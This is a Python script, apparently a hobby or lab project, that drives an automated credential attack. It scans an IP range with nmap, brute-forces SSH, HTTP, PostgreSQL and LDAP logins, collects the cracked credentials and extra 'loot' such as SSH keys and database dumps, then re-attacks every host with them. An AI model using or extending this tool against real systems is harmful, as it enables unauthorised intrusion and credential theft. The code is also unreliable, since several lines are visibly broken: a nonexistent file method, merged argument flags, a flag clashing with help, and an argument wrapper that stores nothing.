#/usr/bin/env python3
import os, sys
import scripts.autonmap as autonmap
from scripts.util import log_loot, get_logged_loot
from scripts.http import HTTP
from scripts.ldap import LDAP
from scripts.ssh import SSH
from scripts.postgresql import postgresql

"""
Stuff that has to be defined on a per-exploit basis
1) What nmap command to run
    - check if a given port is open and is running a certain service
2) What command (python function) do we run to actually exploit the service?
    - Most functions just call Hydra and then parse the output to get loot (usernames, passwords) but LDAP doesn't
    - Need to store the loot somewhere
    - Run this function asynchronously
3) What Python function do we run to exploit the compromised system/service
"""

class Arguments:
    def __init__(self, parser):
        """Set up parameters from command-line arguments."""

exploits = {
    'ssh': SSH,
    'http': HTTP,
    'postgresql': postgresql,
    'ldap': LDAP
}

def read_lines(filename):
    with open(filename, 'r') as f:
        lines = f.read_lines()
    return lines

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Automate Hydra attacks against a specified network range.")
    parser.add_argument("-h", "--host_ips", metavar="<h>", type=str,
                        help="IP address range to search")
    parser.add_argument("-u" "--usernames", metavar="<u>", type=str,
                        help="File with list of usernames", default=None)
    parser.add_argument("-p" "--passwords", metavar="<p>", type=str,
                        help="File with list of passwords", default=None)
    parser.add_argument("-o" "--output", metavar="<o>", type=str,
                        help="Optional file to output results to", default=sys.stdout)
    parser.add_argument("-d", "--domain", metavar="<d>", type=str,
                        help="The domain of a potential LDAP server to attack",
                        default="cn=serviceuser,ou=svcaccts,dc=glauth,dc=com")
    args = Arguments(parser.parse_args())

    # automatically scan the IP address range and log all open ports that we support attacking
    host_openings = autonmap.autonmap(args.host_ips)

## Actual SSH key is stored in: /data/ssh/blah
## Message stating "Sup bro, we got your ssh key stored in this location" is printed to file=self.output
    # by default this is sys.stdout, but can also be a file as specified by user using --output flag

    for host in host_openings:
        # automate a Hydra-esque attack on this host
        for open_service in host_openings[host]:
            exploit = exploits[open_service]
            exploit.output = args.output
            exploit.domain = args.domain # mainly important for LDAP
            print(f"Attacking host {host} on port {exploit.port} using {exploit.name}. This may take a while.",
                    file=args.output)
            # TODO use multiprocessing to do this asynchronously
            # hydra for everyone but ldap
            initial_loot = exploit.attack(host, args.usernames, args.passwords)
            # loot is a list of tuples (username, password). Either field can be None.
            if initial_loot:
                log_loot(initial_loot, args.output)
                # get more info from each service (finger, database dumps, ssh keys, etc.)
                more_loot = exploit.get_loot(initial_loot)
                if more_loot:
                    log_loot(more_loot, args.output)

    # attack with our new loot
    if not get_logged_loot():
        print("Attacks completed. No loot gained.", file=args.output)
        return
    print("Attack completed. Re-attacking services using gathered loot.")

    for host in host_openings:
        found_usernames, found_passwords = zip(*get_logged_loot())
        found_usernames = [x for x in found_usernames if x]
        found_passwords = [x for x in found_passwords if x]
        new_loot = exploit.attack(host, found_usernames, found_passwords)
        if new_loot:
            log_loot(new_loot, args.output)

if __name__=='__main__':
    main()
